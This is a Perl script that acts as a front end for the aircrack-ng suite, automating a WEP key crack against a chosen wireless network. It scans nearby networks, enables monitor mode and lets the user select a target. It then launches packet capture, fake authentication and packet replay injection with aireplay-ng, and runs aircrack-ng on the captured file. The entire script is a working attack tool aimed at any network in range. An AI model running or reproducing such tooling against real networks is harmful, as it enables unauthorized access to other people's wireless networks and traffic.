#!/usr/local/bin/perl
&readyyet;
my $netString;
my $test;
my $netBSSID;
my $answerDigits;
my $file;
my $parent2;
my $parent;
my $pid;
my $parent3;
my $netCHAN;
my $SSID;
my $interfaceString;
my @interFaces;
my $ifaceName;
my $cardMAC;
my $ifaceUsable;

sub checkans {

my($answer, $yes, $the1);
print "Look at the window that is dumping packets, an check the # of data packets, you will need at least 20,000 for 40bit WEP keys. If you begin the crack too early you can always type ^c and restart the crack process by following the prompts. Are you ready to begin the cracking process?";
$answer = <>;
chomp($answer);
print $answer;
if($answer =~ "y"){
system("xterm -hold -e aircrack-ng $file-01.cap");
&wrapup;
}
else{
&checkans;
}

}


sub readyyet {
my($answer, $yes, $the1);
print "Aircrack Frontend V.3\n";
print "Obtaining wireless interface information... \n";
open (FILE, "+>intInfo.dat"); 
		open (scanOut, "ifconfig|");
			while(<scanOut>)
			{
				print FILE $_;
			}
		close scanOut;
close FILE;
open (FILE, "intInfo.dat");
my @ifaceArray = <FILE>;
close FILE;
my $ifaceCounter = 1;
foreach(@ifaceArray)
{
$test = index($_ , "wlan0");
TEST1:
if($test != -1)
{
$ifaceName = "wlan0";
$ifaceUsable = $ifaceName;
goto ICONTINUE;
}
else{
goto TEST2;
}
TEST2:
$test = index($_, "ath0");
if($test != -1)
{
$ifaceName = "ath0";
$ifaceUsable = $ifaceName;
goto ICONTINUE;
}
else{
goto TEST3;
}
TEST3:
$test = index($_, "wifi0");
if($test != -1)
{
$ifaceName = "wifi0";
$ifaceUsable = $ifaceName;
goto ICONTINUE;
}

$ifaceCounter++;
}

ICONTINUE:
my $containingLine = @ifaceArray[$ifaceCounter-1];
chop($containingLine);
my $endPos = index($containingLine, "HWaddr");
$endPos = $endPos + 6;
$cardMAC = substr($containingLine,$endPos);
chomp($cardMAC); 
#chomp($ifaceName);
#stop mon0 to prevent duplicates
system("airmon-ng stop mon0");
#cardMAC is hardware address of card
#ifaceName is interface name
system("airmon-ng start wlan0");
system("airmon-ng start wifi0");
system("airmon-ng start ath0");
&picktarget;
}
sub picktarget {
	my($answer, $yes, $the1);
	
		my $stringVar;
		my $i = 1;
		open (FILE, "+>scanOut.dat"); 
		open (scanOut, "iwlist scan |");
			while(<scanOut>)
			{
				print FILE $_;
			}
		close scanOut;
		close FILE;
		open(NET, "scanOut.dat");
			my @netData = <NET>;
		close(NET);
system("clear");
print "PERL WEP CRACK VERSION 3.03 \n";
		my $networkString;
		my $SSID;
		open (FILE, "+>netWorks.dat");
			foreach $networkString (@netData){
				chomp($networkString);
				$SSID = substr($networkString, 21);
					if((index $SSID, "SSID") != -1)
					{
						print FILE "$SSID\n";
						print "$SSID.............$i\n";
						$i++;
					}
					else{}
	}	

close FILE;
&readytogo;
}



sub readytogo {

my($answer, $yes, $the1);
open (FILE, "netWorks.dat");
my @netArray = <FILE>;
close FILE;
print "Select network to crack [number]?";
$answer = <>;
chomp($answer);
$netString = $netArray[$answer - 1];
$netString = substr($netString, 6);
chop($netString);
chop($netString);
#netString = network name.
#parse channel, bssid.
$answerDigits = length($answer);
if($answerDigits == 1)
{
$answer = "0".$answer;
} 
else{}
#answer is the same as cell number in results.
$answer = $answer;
open (FILE , "scanOut.dat");
my @netData = <FILE>;
close (file);
my $line = 1;
foreach(@netData)
{
$test = index($_ , "Cell $answer");
if($test != -1)
{
goto CONTINUE;
}
else{
}
$line++;
}
CONTINUE:
#apple

#open (FILE, "+>scanOut.dat"); 
#		open (scanOut, "airmon-ng|");
#			while(<scanOut>)
			#{
			#	print FILE $_;
			#}
#		close scanOut;
#close FILE;
#open(NET, "scanOut.dat");
		#my @monData = <NET>;
#close(NET);

#my($answer, $yes, $the1);	
#my $stringVar;
#my $i = 1; 
#foreach $networkString (@monData){
#chomp($networkString);	
#	if((index $networkString, "mon0") != -1)
#		{
#		system "airmon-ng start $ifaceName";
#		}
#		else{
				
#	}
#	}




$line = $line - 1;
#line = position in netData array of cell of network selected.
$netBSSID = @netData[$line];
$netBSSID = substr($netBSSID, 29);
chop($netBSSID);
$line = $line + 3;
$netCHAN = @netData[$line];
$netCHAN = substr($netCHAN , 28);
#netCHAN contains channel.
#netBSSID contains BSSID.
chomp($netBSSID);
chomp($netCHAN);
system("clear");
print "PERL WEP CRACK VERSION 3.03 \n";
print "Enter a file name for capture file:";
$answer = <>;
chomp($answer);
chomp($SSID);
$file = $answer;
$parent = $$;
unless ($pid = fork()){
	$parent2 = $$;
	unless ($pid = fork()){
		$parent3 = $$;
		unless ($pid = fork()){
		system("xterm -hold -e sudo airodump-ng -w $file -c $netCHAN --bssid $netBSSID mon0"); #no
		sleep 5;
		exit();
		}
	sleep 1;
	system("xterm -hold -e sudo aireplay-ng -1 6000 -a $netBSSID -h $cardMAC mon0");#yes
	sleep 5;	
	exit();
	}
system("xterm -hold -e aireplay-ng -2 -p 0841 -c 00:11:22:33:44:55 -b $netBSSID -h $cardMAC mon0");
sleep 5;
exit();
}
&explain;
&checkans;

}



sub explain {
my($answer, $yes, $the1);
print "Take note of the window that is 'read packets' when it finds a suitable packet, type 'y'";
print "\nHave you completed the above step and are ready to continue?";
$answer = <>;
chomp($answer);
if($answer =~ "y"){

}
else{
&explain;
}
}
sub wrapup {
my($answer, $yes, $the1);
print "Was the crack succesful? If not you can restart the process by typing 'n'";
$answer = <>;
chomp($answer);
if($answer =~ "y"){
print "Exiting PERL Aircrack Front End V.3";
exit(); 
}
else{
&tryagain;
}
}
sub tryagain {
my($answer, $yes, $the1);
print "Would you like to try the crack again?";
$answer = <>;
chomp($answer);
if($answer =~ "y"){
system("xterm -hold -e aircrack-ng $file-01.cap");
}
else{
&wrapup;
}
}

